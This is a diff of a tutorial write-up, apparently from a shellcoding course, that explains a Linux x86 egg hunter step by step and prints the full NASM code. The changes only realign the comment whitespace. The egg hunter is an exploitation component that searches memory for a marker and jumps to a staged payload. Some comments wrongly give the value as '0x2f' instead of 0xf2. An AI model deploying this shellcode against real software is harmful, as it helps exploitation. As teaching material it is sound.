@@ -39,27 +39,27 @@ The egg hunter code is divided in four major parts:
 The first step initialize the registers to NULL. 
 ```nasm
 _start:
-	xor ecx, ecx			;Initialize ecx to NULL
-	mul ecx					;Initilize eax and edx to NULL
+	xor ecx, ecx		;Initialize ecx to NULL
+	mul ecx		;Initilize eax and edx to NULL
 ```
 
 The next step is to perform a page alignment operation on the current pointer that is being validated by doing a bitwise OR operation on the low 16-bits of the current pointer (stored in edx) and then incrementing edx by one. This operation is equivalent to adding 0x1000 to the value in edx. The reason these two operations are separated is to avoid nullbytes inside the shellcode.
 
 ```nasm
 _firstStep:
-	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF
+	or dx, 0xfff		;Do a OR on dx register, dx == 0xFFF
 
 _secondStep:
-	inc edx					;Add 1 to edx, edx == 0x1000
+	inc edx		;Add 1 to edx, edx == 0x1000
 ```
 
 The third step is to use a systemcall 'access' which will take an address as a parameter and check for us if the memory address is valid. If not the systemcall will return '0xf2' telling us the given address is invalid and then loop until the result returns a valid address.
 
 ```nasm
 lea ebx, [edx+0x4]		;Ebx now holds the value of edx + 0x4
-push byte +0x21			;Push 0x21 on the stack
-pop eax					;Pop 0x21 which is the systemcall value of access
-int 0x80				;Execute systemcall
+push byte +0x21		;Push 0x21 on the stack
+pop eax			;Pop 0x21 which is the systemcall value of access
+int 0x80			;Execute systemcall
 cmp al, 0xf2			;Compare the systemcall return value to 0x2f
 jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address
 ```
@@ -69,11 +69,11 @@ The last step is to check two times the presence of the egg. Because, if we don'
 ```nasm
 mov eax, 0x50905090		;This instruction will move our egg value inside eax
 mov edi, edx			;Move the address stores in edx to edi
-scasd					;This instruction will compare the value inside eax and edi
-jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
-scasd					;We check a second time the presence of our egg before executing the shellcode
-jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
-jmp edi					;Jump to our payload
+scasd				;This instruction will compare the value inside eax and edi
+jnz _secondStep		;Jump back to '_secondStep' if the comparaison is false
+scasd				;We check a second time the presence of our egg before executing the shellcode
+jnz _secondStep		;Jump back to '_secondStep' if the comparaison is false
+jmp edi			;Jump to our payload
 ```
 
 You can find the whole code below:
@@ -83,26 +83,26 @@ global _start
 
 _start:
 	xor ecx, ecx			;Initialize ecx to NULL
-	mul ecx					;Initilize eax and edx to NULL
+	mul ecx			;Initilize eax and edx to NULL
 
 _firstStep:
 	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF
 
 _secondStep:
-	inc edx					;Add 1 to edx, edx == 0x1000
+	inc edx			;Add 1 to edx, edx == 0x1000
 	lea ebx, [edx+0x4]		;Ebx now holds the value of edx + 0x4
-	push byte +0x21			;Push 0x21 on the stack
-	pop eax					;Pop 0x21 which is the systemcall value of access
-	int 0x80				;Execute systemcall
+	push byte +0x21		;Push 0x21 on the stack
+	pop eax			;Pop 0x21 which is the systemcall value of access
+	int 0x80			;Execute systemcall
 	cmp al, 0xf2			;Compare the systemcall return value to 0x2f
 	jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address
 	mov eax, 0x50905090		;This instruction will move our egg value inside eax
 	mov edi, edx			;Move the address stores in edx to edi
-	scasd					;This instruction will compare the value inside eax and edi
-	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
-	scasd					;We check a second time the presence of our egg before executing the shellcode
-	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
-	jmp edi					;Jump to our payload
+	scasd				;This instruction will compare the value inside eax and edi
+	jnz _secondStep		;Jump back to '_secondStep' if the comparaison is false
+	scasd				;We check a second time the presence of our egg before executing the shellcode
+	jnz _secondStep		;Jump back to '_secondStep' if the comparaison is false
+	jmp edi			;Jump to our payload
 ```
 
 Let's compile it:
